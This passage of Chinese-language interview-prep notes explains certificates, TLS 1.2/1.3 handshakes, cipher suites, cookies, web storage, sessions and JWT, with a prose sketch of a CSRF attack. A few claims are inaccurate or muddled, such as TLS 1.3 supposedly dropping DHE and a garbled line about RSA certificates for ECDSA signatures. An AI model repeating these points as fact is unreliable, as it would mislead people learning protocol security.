所有维度都通过，才能确认「这就是我要通信的真实服务端」。

**5. 类比理解**

数字证书就像「公安机关签发的身份证」：
- 身份证上有姓名、照片、身份证号 → 证书上有域名、公钥、有效期
- 公安机关盖章 → CA 的数字签名
- 别人通过验证印章真伪 → 浏览器用 CA 公钥验签
- 验证通过就相信身份证是真的 → 信任证书里的身份信息

**6. 双向认证（mTLS）**

服务端也可以要求客户端提供证书，做对称的身份验证：
- 服务端验证客户端证书 → 确认客户端身份
- 常用于内部服务间通信、零信任架构、银行/政务系统

**总结**：数字证书之所以能验证身份，是因为它把「公钥」和「身份」绑定在一起，并由受信任的 CA 用私钥签名背书。客户端用内置的 CA 公钥验签 + 多维度校验，就能确认通信对端的真实身份，从根本上防止中间人冒充。

### 请详细的说一下HTTPS它的加密传输过程，涉及到哪些算法呢？

HTTPS 的安全通信分为两阶段：**握手阶段用非对称加密协商密钥，传输阶段用对称加密传输数据**。整个过程涉及多类算法。

**1. 涉及的算法分类**

| 类别 | 作用 | 算法示例 |
|------|------|----------|
| 非对称加密（密钥交换） | 安全协商对称密钥 | RSA、ECDHE、DHE |
| 对称加密（数据传输） | 加密实际内容 | AES-GCM、AES-CBC、ChaCha20 |
| 哈希算法 | 摘要、完整性 | SHA-256、SHA-384、SHA-512 |
| 消息认证码（MAC） | 防篡改 | HMAC-SHA256 |
| AEAD | 加密 + 认证一体化 | AES-GCM、ChaCha20-Poly1305 |
| 数字签名 | CA 给证书签名 | RSA-PSS、ECDSA、Ed25519 |
| 伪随机函数（PRF） | 派生密钥 | HKDF（TLS 1.3）、PRF（TLS 1.2） |

**2. TLS 1.2 完整流程（RSA 模式，已逐渐被 ECDHE 取代）**

```text
1. ClientHello
   - TLS 版本
   - 客户端随机数 ClientRandom（用于派生密钥）
   - 支持的加密套件列表
   - 支持的压缩方法

2. ServerHello + 证书 + ServerHelloDone
   - 选定加密套件，如 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
   - 服务端随机数 ServerRandom
   - X.509 证书（含服务端公钥）

3. 客户端校验证书（CA 链、域名、有效期、吊销状态）

4. 客户端生成 PreMasterSecret，用服务端公钥加密发送

5. 双方派生会话密钥：
   MasterSecret = PRF(PreMasterSecret, "master secret",
                      ClientRandom + ServerRandom)
   KeyBlock = PRF(MasterSecret, "key expansion",
                  ServerRandom + ClientRandom)
   → client_write_key, server_write_key, MAC keys, IVs

6. 客户端发 ChangeCipherSpec + Finished（用会话密钥加密）

7. 服务端发 ChangeCipherSpec + Finished

8. 后续通信用对称密钥（AES-GCM）加密 + AEAD 认证
```

**3. 加密套件命名（Cipher Suite）**

格式：`TLS_KX_AUTH_CIPHER_HASH` 或 `TLS_CIPHER_HASH`（TLS 1.3 简化）

```text
TLS 1.2:
  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
  └┬┘ └─┬─┘ └┬┘ └─────┬─────┘ └─┬─┘
  TLS KX     AUTH  Cipher       Hash
       ECDHE RSA   AES-128-GCM  SHA256
       密钥交换  签名算法  对称加密+AEAD   哈希

TLS 1.3:
  TLS_AES_256_GCM_SHA384
  TLS_CHACHA20_POLY1305_SHA256
  （只保留 Cipher + Hash，KX 由握手统一在 ECDHE 里）
```

**4. TLS 1.3 简化流程（强制 ECDHE）**

```text
1. ClientHello
   - 客户端随机数
   - 客户端 ECDHE 公钥（在握手中直接发）
   - 支持 Early Data（可选）

2. ServerHello + 证书 + 签名 + 服务端 ECDHE 公钥 + Finished
   - 一个 RTT 完成

3. 客户端发 Finished
   - 立即可发应用数据

4. 后续通信用 ECDHE 协商出的对称密钥加密
```

- 1-RTT 握手（首连）
- 0-RTT 复用（PSK）
- 强制 ECDHE，提供前向安全

**5. 各算法在流程中的位置**

| 算法 | 用在哪 |
|------|-------|
| ECDHE / RSA | 握手时协商 PreMasterSecret |
| ECDSA / RSA-PSS | CA 给证书签名 |
| SHA-256 | 派生密钥、证书签名哈希 |
| AES-GCM / ChaCha20 | 传输数据时对称加密 |
| HMAC-SHA256 | 1.2 早期 MAC 校验 |
| AEAD（GCM/Poly1305） | 1.3 强制，加密+完整性一体 |

**6. 数据传输阶段的加密**

TLS Record 层：

```text
应用数据
  ↓ 分块
  ↓ 加序列号 + 内容类型
  ↓ AEAD 加密（AES-GCM）
  ↓ 加 TLS Record Header
密文段
```

- 每条记录有独立 nonce（由序列号派生）
- AEAD 同时提供加密 + 完整性，无需单独 MAC

**7. 常见密钥交换算法对比**

| 算法 | 前向安全 | 性能 | 现状 |
|------|----------|------|------|
| RSA | 否（私钥泄露可解密历史） | 中 | TLS 1.3 已废弃 |
| DHE | 是 | 慢 | 兼容性差 |
| ECDHE | 是 | 快 | TLS 1.3 唯一选项 |

**8. 已被淘汰的弱算法**

- SSL 3.0、TLS 1.0/1.1：协议层漏洞（POODLE、BEAST）
- RC4：流密码，已禁用
- 3DES：太慢且有 Sweet32 攻击
- CBC 模式：易遭 Lucky13、BEAST 攻击
- SHA-1：已不安全
- RSA-PKCS#1 v1.5：易遭 Bleichenbacher 攻击，改用 RSA-PSS

**总结**：HTTPS 加密传输是一个分层组合：**ECDHE/RSA 协商密钥 + AES-GCM 加密数据 + SHA-256 派生密钥 + ECDSA 给证书签名**。TLS 1.3 把流程简化为 1-RTT，强制 ECDHE 提供前向安全，废弃了所有不安全的算法。

### 描述一下RSA握手

**RSA 握手** 是 TLS 1.2 早期常用的密钥交换方式：用服务端的 RSA 公钥加密客户端生成的预备主密钥，实现密钥协商。**TLS 1.3 已废弃此方式**（无前向安全）。

**1. 流程**

```text
1. ClientHello
   Client → Server
   - 支持的 TLS 版本（如 1.2）
   - ClientRandom（客户端随机数，32 字节）
   - 支持的加密套件列表
   - 支持的压缩方法
   - Session ID（用于会话恢复）

2. ServerHello + 证书 + ServerHelloDone
   Server → Client
   - 选定的 TLS 版本
   - ServerRandom（服务端随机数，32 字节）
   - 选定的加密套件，如 TLS_RSA_WITH_AES_128_GCM_SHA256
   - X.509 数字证书（含服务端 RSA 公钥）
   - ServerHelloDone

3. 客户端校验证书
   - CA 签名链 → 根 CA
   - 域名匹配 SAN
   - 有效期
   - 吊销状态（OCSP / CRL）
   - 签名算法强度

4. 客户端生成 PreMasterSecret
   - 46 字节随机数 + 2 字节版本号 = 48 字节
   - 用服务端证书中的 RSA 公钥加密
   - 发送 Encrypted PreMasterSecret
   Client → Server：ClientKeyExchange（含加密的 PMS）
   Client → Server：ChangeCipherSpec + Finished

5. 服务端用 RSA 私钥解密拿到 PreMasterSecret

6. 双方派生会话密钥
   MasterSecret = PRF(PreMasterSecret, "master secret",
                      ClientRandom + ServerRandom)
   KeyBlock = PRF(MasterSecret, "key expansion",
                  ServerRandom + ClientRandom)
   → client_write_key, server_write_key, MAC keys, IVs

7. Server → Client：ChangeCipherSpec + Finished

8. 后续通信用对称密钥（如 AES-GCM）加密
```

**2. 总共耗时**

- 2 个 RTT 完成（TLS 1.2 RSA 模式）
- 加上 TCP 三次握手（1 RTT），总共 3 RTT 才能发第一个应用数据

**3. 关键点**

- **PreMasterSecret 仅客户端生成**，用服务端公钥加密后传给服务端
- 服务端用对应私钥解密 → 拿到 PMS
- 双方再用 ClientRandom + ServerRandom + PMS 派生出对称会话密钥
- 后续通信用对称密钥加密

**4. 致命缺陷：无前向安全**

**前向安全（Forward Secrecy）**：即使服务端私钥日后泄露，已记录的历史流量也无法被解密。

RSA 握手**没有前向安全**：
- 攻击者录下所有 HTTPS 流量
- 假以时日，服务端私钥泄露（被入侵、被法院强制提供）
- 攻击者用私钥解出每个会话的 PreMasterSecret
- 派生出对称密钥，解密所有历史流量

**5. 其他问题**

- RSA 密钥交换本身不能签名（RSA 既能做加密又能做签名，但用法不同）
- 易遭 Bleichenbacher Oracle 攻击（针对 PKCS#1 v1.5 填充）
- 性能不如 ECDHE

**6. 现状**

- TLS 1.3 强制使用 ECDHE，禁用 RSA 密钥交换
- 主流浏览器已不支持纯 RSA 握手
- 但服务端可能仍配置 RSA 证书用于 ECDSA 签名（双证书配置）

**7. 何时还会遇到 RSA 握手？**

- 老旧服务器（TLS 1.0/1.1 + RSA）
- 老旧客户端
- 面试作为 TLS 握手原理的经典讲解（理解 RSA 后再讲 ECDHE 的改进）

**总结**：RSA 握手是 TLS 1.2 的经典流程，核心是用服务端公钥加密 PreMasterSecret 协商密钥。简单但无前向安全，已被 TLS 1.3 强制废弃，由 ECDHE 取代。

### ECDHE握手和RSA握手又有什么区别呢

ECDHE 和 RSA 是 TLS 1.2 两种主流密钥交换方式，**ECDHE 提供 RSA 没有的前向安全**，被 TLS 1.3 强制使用。

**1. 核心差异对比**

| 维度 | RSA 握手 | ECDHE 握手 |
|------|----------|------------|
| 密钥协商方式 | 客户端生成 PMS，用服务端公钥加密发送 | 双方交换 ECDHE 公钥，各自算出共享密钥 |
| 服务端私钥作用 | 解密 PMS（参与密钥生成） | 仅给握手签名，证明身份 |
| 前向安全（Forward Secrecy） | **否** | **是** |
| 私钥泄露后 | 可解密所有历史流量 | 仅影响身份冒充，不能解密历史流量 |
| 握手 RTT（TLS 1.2） | 2 RTT | 2 RTT（TLS 1.3 简化为 1 RTT） |
| 性能 | RSA 加解密较慢 | ECDHE 较快（椭圆曲线） |
| 算法 | RSA | ECDHE（ECC） |
| 安全性 | 易遭 Bleichenbacher 攻击 | 不受此类攻击影响 |
| 现状 | TLS 1.3 废弃 | TLS 1.3 强制 |

**2. RSA 握手回顾**

```text
客户端生成 PreMasterSecret
   ↓ 用服务端 RSA 公钥加密
   ↓ 发给服务端
服务端用 RSA 私钥解密
   ↓ 拿到 PMS
双方派生会话密钥
```

- 私钥直接参与密钥生成
- 私钥泄露 → 历史流量可解密

**3. ECDHE 握手流程**

ECDHE = **Elliptic Curve Diffie-Hellman Ephemeral**，椭圆曲线 Diffie-Hellman 临时密钥交换。

```text
1. ClientHello
   - ClientRandom
   - 支持的曲线（如 x25519、secp256r1）
   - 客户端 ECDHE 临时公钥 Qc（在握手中直接发，TLS 1.3）

2. ServerHello + 证书 + 服务端 ECDHE 公钥
   - ServerRandom
   - 服务端 ECDHE 临时公钥 Qs
   - 服务端用 RSA 私钥对握手签名（仅用于身份认证）

3. 双方计算共享密钥
   客户端：Z = Qs * dc（dc 是客户端临时私钥）
   服务端：Z = Qc * ds（ds 是服务端临时私钥）
   由椭圆曲线性质，双方算出同一个 Z

4. 派生会话密钥：Z + ClientRandom + ServerRandom → 对称密钥

5. 后续通信用对称密钥加密
```

**4. ECDHE 的关键优势：前向安全**

- 每次握手都用**临时 ECDHE 密钥对**（连接结束即销毁）
- 服务端 RSA 私钥**只用于签名认证**，不参与密钥生成
- 即使日后服务端 RSA 私钥泄露：
  - 攻击者无法冒充服务端（可被签名认证拦住）
  - 但**无法解密历史流量**（因为临时 ECDHE 私钥已销毁）

```text
攻击者录下流量：
  - 仅有 ECDHE 公钥（Qc、Qs）→ 椭圆曲线离散对数难题不可解
  - 拿到 RSA 私钥 → 也派生不出会话密钥（RSA 私钥只签名不加密 PMS）
```

**5. 性能对比**

- RSA：每次握手做一次 RSA 解密（私钥运算）+ 一次 RSA 加密（公钥运算）
- ECDHE：双方各做一次椭圆曲线标量乘法，比 RSA 私钥运算快
- TLS 1.3 + x25519 曲线，性能优于 RSA

**6. 双证书搭配**

实际部署常见 RSA + ECDSA 双证书：
- 老客户端 → RSA 证书 + RSA 握手
- 新客户端 → ECDSA 证书 + ECDHE 握手
- 服务端根据 ClientHello 自动选择

**7. TLS 1.3 的选择**

TLS 1.3 把所有密钥交换统一为 ECDHE（或 PSK）：
- 废除 RSA 密钥交换
- 强制前向安全
- 握手简化到 1-RTT

**总结**：ECDHE 是 RSA 的进化版，把「用私钥解密 PMS」改成「双方交换临时公钥算共享密钥」，让服务端私钥脱离密钥生成过程，从而获得前向安全。TLS 1.3 强制 ECDHE。

### 你知道TSL1.3版本吗？它较TSL1.2做了哪些改进呢？

**TLS 1.3**（RFC 8446，2018 年正式发布）是 TLS 协议近十年最重要的升级，相比 TLS 1.2 在**速度、安全、简洁性**上都做了大幅改进。

**1. 核心改进总览**

| 改进项 | TLS 1.2 | TLS 1.3 |
|--------|---------|---------|
| 握手 RTT | 2 RTT | 1 RTT（首连）/ 0 RTT（复用） |
| 密钥交换 | RSA / DHE / ECDHE | 仅 ECDHE / PSK |
| 前向安全 | 可选 | 强制 |
| 加密套件 | 多达数十种 | 仅 5 种 AEAD |
| 对称加密 | CBC / GCM | 仅 GCM / ChaCha20 |
| 哈希 | MD5 / SHA-1 / SHA-2 | 仅 SHA-2 |
| 签名算法 | RSA-PKCS#1 v1.5 等 | RSA-PSS / ECDSA / Ed25519 |
| 压缩 | 支持 | 移除（CRIME 攻击） |
| 静态 RSA | 支持 | 废除 |
| 重协商 | 支持 | 移除 |
| ChangeCipherSpec | 必需 | 废除（兼容性保留空消息） |

**2. 握手简化：2 RTT → 1 RTT**

TLS 1.2 RSA 握手：

```text
1. ClientHello
2. ServerHello + 证书
3. 客户端发 PMS + Finished
4. 服务端 Finished
5. 应用数据
（2 RTT）
```

TLS 1.3 ECDHE 握手：

```text
1. ClientHello + 客户端 ECDHE 公钥 + 早期数据（可选）
2. ServerHello + 服务端 ECDHE 公钥 + 证书 + Finished
3. 客户端 Finished
4. 应用数据
（1 RTT）
```

- ClientHello 阶段就把 ECDHE 公钥发出去
- 服务端响应里一次性带上证书 + 公钥 + Finished
- 减少一个 RTT，弱网下首屏体验明显改善

**3. 0-RTT 复用（PSK）**

```text
已连过的服务器，重连时：
Client → ClientHello + 早期数据（带应用数据） → Server
（0 RTT，第一个包就带数据）
```

- 用之前会话的 PSK（Pre-Shared Key）
- 第一个包就带 HTTP 请求
- 注意：**0-RTT 有重放攻击风险**，不能用于非幂等操作（如转账）

**4. 强制前向安全**

- 移除 RSA 密钥交换
- 仅保留 ECDHE / PSK
- 即使服务端私钥日后泄露，历史流量也安全

**5. 简化加密套件**

TLS 1.2 有几十种 CipherSuite 组合（CBC、GCM、各种密钥交换），其中 CBC 模式有 Lucky13 攻击。

TLS 1.3 只保留 5 种 AEAD 套件：

```text
TLS_AES_128_GCM_SHA256
TLS_AES_256_GCM_SHA384
TLS_CHACHA20_POLY1305_SHA256
TLS_AES_128_CCM_SHA256
TLS_AES_128_CCM_8_SHA256
```

- AEAD = 加密 + 完整性一体，无需单独 MAC
- 全部是现代安全算法

**6. 移除不安全的特性**

- 移除 RSA 密钥交换
- 移除 DHE（性能差）
- 移除静态 DH / 静态 ECDH
- 移除压缩（CRIME 攻击）
- 移除重协商（漏洞多）
- 移除 ChangeCipherSpec（合并到握手）
- 废弃 RC4、3DES、MD5、SHA-1
- 废弃 RSA-PKCS#1 v1.5 填充

**7. 改进的握手消息结构**

- 把多个消息合并发送（ServerHello + Certificate + Finished 一起）
- 减少往返
- 加密更多握手消息（在 TLS 1.2 中部分握手消息是明文）

**8. 签名算法改进**

- 仅允许 RSA-PSS、ECDSA、Ed25519
- 不再允许 RSA-PKCS#1 v1.5（易遭 Bleichenbacher）
- Ed25519 性能更好、密钥更短

**9. Session Resumption 改进**

- 用 PSK 替代 Session ID / Session Ticket
- PSK 派生自上次会话的密钥
- 支持 0-RTT 早期数据

**10. 现状**

- 主流浏览器（Chrome、Firefox、Edge、Safari）已支持
- 主流服务器（Nginx 1.13+、OpenSSL 1.1.1+、BoringSSL）已支持
- HTTP/3 强制 TLS 1.3
- Let's Encrypt 等证书完全兼容

**总结**：TLS 1.3 把握手简化到 1-RTT、强制 ECDHE 提供前向安全、移除所有不安全算法、支持 0-RTT 复用。相比 1.2 更快、更安全、更简洁，是现代 HTTPS 的事实标准。

## 鉴权

### Cookie和session的区别

Cookie 和 Session 都用于在 HTTP 无状态协议下维持用户状态，但二者存储位置、安全性、生命周期都不同。

| 对比项 | Cookie | Session |
|--------|--------|---------|
| 存储位置 | 客户端（浏览器） | 服务端（内存/Redis/数据库） |
| 存储容量 | 单条约 4KB，每域约 50 条 | 服务端内存，理论上不限 |
| 安全性 | 明文存客户端，易被篡改/窃取 | 数据在服务端，相对安全 |
| 生命周期 | 由 `Expires`/`Max-Age` 控制，可长期 | 默认随会话结束失效，可配置过期 |
| 是否依赖 Cookie | 不依赖 | 依赖 Cookie 传递 sessionId |
| 跨域支持 | 受同源策略限制 | 同样受同源策略限制 |
| 性能 | 不占服务端资源 | 大量会话占用服务端内存 |

**两者协作机制：**

1. 用户首次登录，服务端创建一个 Session 对象，生成唯一 `sessionId`
2. 通过 `Set-Cookie` 把 `sessionId` 写入客户端 Cookie
3. 后续请求浏览器自动带上 Cookie，服务端从中取出 `sessionId`，定位对应用户的会话数据

```http
// 登录响应
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123xyz; HttpOnly; Secure; SameSite=Lax

// 后续请求
GET /profile HTTP/1.1
Cookie: sessionId=abc123xyz
```

**实践演进：** 现代分布式架构常用 **JWT（JSON Web Token）** 替代传统 Session，把用户信息编码在 Token 里放在请求头，避免服务端存储会话状态，更易横向扩展。但传统 Session 在小型站点、需要强制下线等场景仍有优势。

### cookie sessionStorage localStorage区别

三者都是浏览器本地存储方案，但用途、容量、生命周期差异明显。

| 特性 | Cookie | localStorage | sessionStorage |
|------|--------|--------------|---------------|
| 设计初衷 | 维持 HTTP 状态 | 本地持久存储 | 会话级存储 |
| 容量 | ~4KB / 域 | ~5-10MB / 域 | ~5-10MB / 域 |
| 生命周期 | 由 `Expires`/`Max-Age` 决定，可永久 | 永久，除非手动清除 | 仅当前标签页有效，关闭即失效 |
| 是否随请求发送 | 自动随 HTTP 请求发送 | 不发送 | 不发送 |
| 作用域 | 同源 + 同路径 | 同源共享 | 同源 + 同标签页 |
| API | `document.cookie`（字符串拼接） | `localStorage.setItem/getItem` | `sessionStorage.setItem/getItem` |
| 安全属性 | `HttpOnly`、`Secure`、`SameSite` 等 | 无 | 无 |
| 服务端可写 | 可（`Set-Cookie`） | 否 | 否 |

**API 示例：**

```js
// localStorage / sessionStorage
localStorage.setItem('user', JSON.stringify({ id: 1 }))
const user = JSON.parse(localStorage.getItem('user'))
localStorage.removeItem('user')
localStorage.clear()

// cookie（字符串拼接，麻烦）
document.cookie = 'name=Tom; max-age=3600; path=/'
```

**使用场景：**

- **Cookie**：身份认证 sessionId、CSRF token、用户偏好（与服务器交互的数据）
- **localStorage**：缓存数据、用户配置、不敏感的长期数据（如主题、语言、JWT token）
- **sessionStorage**：单次会话临时数据，如多步表单中间状态、临时草稿

**注意：** 三者都遵循**同源策略**，且存储的都是字符串；都**不要存敏感数据**（密码、信用卡号），因为都可被 JS 读取（除非 Cookie 设了 `HttpOnly`）。

### cookie有哪些字段可以设置

Cookie 通过 `Set-Cookie` 响应头设置，可以包含多个属性。每个属性用 `;` 分隔。

```http
Set-Cookie: sessionId=abc123; Domain=.example.com; Path=/; Max-Age=3600; Expires=Wed, 09 Jul 2026 12:00:00 GMT; Secure; HttpOnly; SameSite=Lax
```

**完整字段：**

| 字段 | 说明 | 示例 |
|------|------|------|
| `Name=Value` | 键值对，必填 | `sessionId=abc123` |
| `Domain` | 生效域名，子域可继承（前缀 `.`） | `Domain=.example.com` |
| `Path` | 生效路径，子路径可继承 | `Path=/api` |
| `Expires` | 绝对过期时间（HTTP/1.0） | `Expires=Wed, 09 Jul 2026 12:00:00 GMT` |
| `Max-Age` | 相对有效时长（秒），优先级高于 `Expires` | `Max-Age=3600` |
| `Secure` | 仅 HTTPS 下发送 | `Secure` |
| `HttpOnly` | JS 读不到，防 XSS | `HttpOnly` |
| `SameSite` | 跨站发送策略 | `SameSite=Strict/Lax/None` |
| `Priority` | 优先级（Chrome 私有） | `Priority=High` |
| `Partitioned` | 分区 Cookie（CHIPS），第三方 Cookie 替代方案 | `Partitioned` |

**字段详解：**

**1. 作用域**

- `Domain`：不设置则默认为当前域，且**不带子域**；显式设置 `Domain=.example.com` 则子域共享
- `Path`：默认为当前路径；设为 `Path=/` 则全站生效

**2. 生命周期**

- 同时设置 `Expires` 和 `Max-Age` → `Max-Age` 优先
- 都不设 → 默认是 **Session Cookie**，浏览器关闭即失效
- `Max-Age=0` → 立即删除该 Cookie

**3. 安全**

- `Secure`：仅 HTTPS 发送
- `HttpOnly`：防止 XSS 窃取（关键身份 Cookie 必加）
- `SameSite`：

| 值 | 行为 |
|----|------|
| `Strict` | 完全不带 Cookie 跨站请求 |
| `Lax`（默认） | 顶层导航的 GET 请求会带 |
| `None` | 跨站都带，**必须同时设 `Secure`** |

**4. `Partitioned`（CHIPS）**

Chrome 推出的"分区 Cookie"，让第三方嵌入场景下 Cookie 按顶层站点分区，避免跨站追踪。

**读取与设置（前端）：**

```js
// 设置（注意前端无法设 HttpOnly）
document.cookie = 'token=xyz; max-age=3600; path=/; Secure; SameSite=Strict'

// 读取（仅能读非 HttpOnly 的）
console.log(document.cookie)
```

### cookie有哪些编码方式？

Cookie 值中不能直接包含 `;`、`,`、空格、`=` 等特殊字符（这些字符是分隔符或语法符号），因此写入 Cookie 前需要对值编码。常见编码方式：

**1. `encodeURIComponent` / `decodeURIComponent`（最常用）**

对单引号外的特殊字符进行 URL 编码，是存 JSON 数据时最常用的方式：

```js
// 写入
const user = { id: 1, name: 'Tom & Jerry' }
document.cookie = `user=${encodeURIComponent(JSON.stringify(user))}; max-age=3600`

// 读取
const match = document.cookie.match(/user=([^;]+)/)
const user = JSON.parse(decodeURIComponent(match[1]))
```

**2. `encodeURI` / `decodeURI`**

不编码 `;`、`,`、`/`、`?`、`:`、`@`、`&`、`=`、`+`、`$`、`#`，对完整 URI 友好，但**不适合 Cookie**（`,` 和 `;` 是 Cookie 的分隔符）。

**3. `escape` / `unescape`（已废弃）**

旧版编码方式，已被 ECMAScript 废弃，不要使用。

**4. Base64（`btoa` / `atob`）**

把二进制或 Unicode 字符串转为 ASCII 安全字符串：

```js
const encode = (str) => btoa(unescape(encodeURIComponent(str)))
const decode = (str) => decodeURIComponent(escape(atob(str)))

document.cookie = `data=${encode('中文内容')}; max-age=3600`
```

注意：原生 `btoa` 不支持 Unicode，要先转 UTF-8。

**5. 自定义转义**

简单场景可以只替换 `;` 和 `=`：

```js
const safe = str => str.replace(/;/g, '%3B').replace(/=/g, '%3D')
```

**最佳实践：** 存对象数据用 `JSON.stringify` + `encodeURIComponent`；存中文/特殊字符时确保完整往返编解码。读取时务必按相同方式反解码。

### 除了cookie，还有什么存储方式。说说cookie和localStorage的区别

浏览器端存储方案远不止 Cookie，HTML5 引入了一系列更强大的本地存储能力。

**所有客户端存储方式：**

| 方案 | 容量 | 生命周期 | 同步/异步 | 用途 |
|------|------|---------|----------|------|
| Cookie | ~4KB | 可配置 | 同步 | 与服务器通信 |
| localStorage | ~5-10MB | 永久 | 同步 | 持久化数据 |
| sessionStorage | ~5-10MB | 标签页关闭即失效 | 同步 | 会话临时数据 |
| IndexedDB | 数百 MB～GB | 永久 | 异步 | 大量结构化数据 |
| Web SQL | — | 已废弃 | 异步 | 已被 IndexedDB 取代 |
| Cache API | 较大 | 永久 | 异步 | Service Worker 离线缓存 |
| File API / OPFS | 较大 | 永久 | 异步 | 文件系统 |
| `window.name` | ~2MB | 标签页生命周期 | 同步 | 已弃用，跨域传数据 |
| Indexed Cursor / `session` 库 | — | — | — | 第三方封装 |

**IndexedDB 示例：**

```js
const req = indexedDB.open('myDB', 1)
req.onupgradeneeded = (e) => {
  const db = e.target.result
  db.createObjectStore('users', { keyPath: 'id' })
}
req.onsuccess = (e) => {
  const db = e.target.result
  const tx = db.transaction('users', 'readwrite')
  tx.objectStore('users').add({ id: 1, name: 'Tom' })
}
```

**Cookie 与 localStorage 的区别：**

| 对比项 | Cookie | localStorage |
|--------|--------|--------------|
| 设计目的 | 维持 HTTP 状态 | 本地持久存储 |
| 容量 | ~4KB | ~5-10MB |
| 是否随请求发送 | 自动发送（增加流量） | 不发送 |
| 生命周期 | 由 `Expires`/`Max-Age` 控制 | 永久，除非手动清除 |
| API | 字符串拼接（难用） | `getItem/setItem` 简洁 |
| 服务端可写 | 是（`Set-Cookie`） | 否 |
| 安全属性 | `HttpOnly`、`Secure`、`SameSite` | 无 |
| 适合存 | 身份凭证 | 用户偏好、缓存数据、Token（注意 XSS） |

**选择建议：**

- 需要服务端读取的（sessionId、CSRF token）→ Cookie + `HttpOnly`
- 仅前端用的配置、缓存 → localStorage
- 大量结构化数据 → IndexedDB
- 离线资源 → Cache API + Service Worker
- 临时数据 → sessionStorage

### Token、cookie、Session区别

三者都是 Web 维持用户登录态的机制，但**存储位置、传输方式、安全特性、扩展性**都不同。

**1. 三者定义**

- **Session（会话）**：服务端保存用户状态，生成一个 sessionId 通过 Cookie 传给客户端。客户端每次请求带 sessionId，服务端用它查会话数据。
- **Cookie**：HTTP 协议提供的客户端存储机制，可存任意键值对，每次请求自动带上。
- **Token（如 JWT）**：自包含的字符串，把用户身份信息编码在内，前端拿到后存在 localStorage/Cookie，请求时放在 `Authorization` 头发送。

**2. 对比表**

| 维度 | Cookie | Session | Token（JWT） |
|------|--------|---------|--------------|
| 存储位置 | 客户端（浏览器） | 服务端（内存/Redis） | 客户端（localStorage/Cookie） |
| 传输方式 | 每次请求自动带 | 通过 Cookie 传 sessionId | 应用层手动放 Header |
| 数据大小 | ~4KB | 服务端内存，无限制 | ~1-2KB |
| 是否加密 | 明文（值） | 数据在服务端 | 签名但明文（不要存敏感信息） |
| 服务端开销 | 低 | 高（每会话占内存） | 低（无状态） |
| 跨域支持 | 严格同源策略 | 同 Cookie | 易跨域（放 Header） |
| 主动失效 | 设 `Max-Age=0` 删除 | 服务端删 session | 难（无状态，要黑名单） |
| 移动端友好 | 一般（Cookie 处理麻烦） | 一般 | 好 |
| 防止 CSRF | 易中招（自动带 Cookie） | 易中招 | 不易（不自动发） |
| 防止 XSS | HttpOnly 可防 | 不直接受影响 | 易被 JS 窃取 |

**3. Session 的工作流程（典型）**

```text
1. 用户登录：POST /login {user, pass}
2. 服务端校验通过，创建 Session：
   sessions[sessionId] = { userId, expire }
3. Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Lax
4. 后续请求自动带 Cookie: sessionId=abc
5. 服务端查 sessions[abc] → 拿到 userId
6. 退出：服务端删 sessions[abc]，客户端删 Cookie
```

**4. Token（JWT）的工作流程**

```text
1. 用户登录：POST /login {user, pass}
2. 服务端校验通过，生成 JWT：
   Header.Payload.Signature（用私钥签名）
3. 返回给前端：{ token: "xxx.yyy.zzz" }
4. 前端存 localStorage 或 Cookie
5. 后续请求加 Header：Authorization: Bearer xxx.yyy.zzz
6. 服务端验签 → 拿到 Payload 中的 userId
7. 退出：前端删 Token（但 Token 在有效期内仍可用，除非黑名单）
```

JWT 三部分：

```text
Header.Payload.Signature

Header  = {"alg":"HS256","typ":"JWT"}           → Base64URL
Payload = {"userId":1,"exp":1690000000}          → Base64URL
Signature = HMAC-SHA256(Header.Payload, secret)
```

**5. 各自适用场景**

| 场景 | 推荐 |
|------|------|
| 传统 Web 站点，需要主动下线 | Session + Cookie |
| 大型分布式后端、跨域 API | Token（JWT） |
| 移动 App / 第三方 API | Token |
| 银行/政务等高安全 | Session + 短期 Token + 双因素 |
| 微服务间调用 | Token（短期 JWT） |

**6. 混合方案：Refresh Token**

- 访问令牌（Access Token）：短期（如 15 分钟）
- 刷新令牌（Refresh Token）：长期（如 7 天），存 HttpOnly Cookie
- Access Token 过期 → 用 Refresh Token 换新的
- 兼顾无状态 + 安全性

**7. 注意事项**

- **Token 不能存敏感数据**：JWT 的 Payload 仅 Base64 编码，可解
- **Cookie 防护**：`HttpOnly + Secure + SameSite` 必加
- **Token 防护**：HTTPS、`Authorization` 头、短有效期
- **防 CSRF**：Cookie 用 SameSite，Token 不放 Cookie 自动发送
- **防 XSS**：Cookie + HttpOnly，Token 要小心存 localStorage（易被 XSS 窃取）

**总结**：Session 是服务端方案（重），Cookie 是客户端容器，Token 是自包含凭证（轻）。现代分布式架构倾向 Token，但需要解决主动失效和刷新机制；传统站点仍适合 Session。

### cookie 和 token 都存放在 header 中，为什么不会劫持 token？

**严格说：Token 也会被劫持**。如果攻击者能拿到 Token，他就能冒充用户。问题前提（"不会劫持"）并不完全成立，但 Token 相比 Cookie 确实在**防 CSRF、防自动发送**方面有天然优势。下面解释为什么 Token 更难被「自动劫持」。

**1. 核心区别：传输方式不同**

| 项 | Cookie | Token |
|----|--------|-------|
| 存储位置 | 浏览器自动管理 | localStorage / sessionStorage / Cookie |
| 发送方式 | **每次请求自动带**（同源） | **应用层主动加 Header** |
| 跨站是否自动带 | 默认会（除非 SameSite） | 不会（需代码主动加） |
| CSRF 风险 | 高（自动带 → 易被借刀） | 低（不自动发） |

**2. CSRF 原理：Cookie 被自动发送**

CSRF 攻击的核心是「浏览器会自动带 Cookie」：

```text
1. 用户登录 bank.com，浏览器存了 sessionId Cookie
2. 用户访问 evil.com，里面有一个表单提交到 bank.com/transfer
3. 浏览器发请求到 bank.com 时，自动带上 sessionId Cookie
4. bank.com 以为是用户本人操作 → 执行转账
```

Token 不会这样被劫持，因为：
- Token 存在 localStorage 里，浏览器不会自动发送
- 必须 JS 代码主动 `fetch(url, { headers: { Authorization: 'Bearer xxx' } })`
- 跨站请求即使能发，evil.com 的 JS 也读不到 bank.com 域下的 localStorage（同源策略）

**3. 同源策略保护 Token**

浏览器同源策略（Same-Origin Policy）：
- 跨域脚本无法读取其他域的 localStorage / sessionStorage / Cookie（HttpOnly）
- evil.com 的 JS 调用 `localStorage.getItem('token')` 只能读自己域，读不到 bank.com 的

所以即使 evil.com 能让浏览器发请求到 bank.com，**也无法在请求头里附上 bank.com 的 Token**——因为它根本拿不到。

**4. CORS 进一步限制**

```text
evil.com 想给 bank.com 发请求并带 Token：
  - 浏览器先检查 CORS
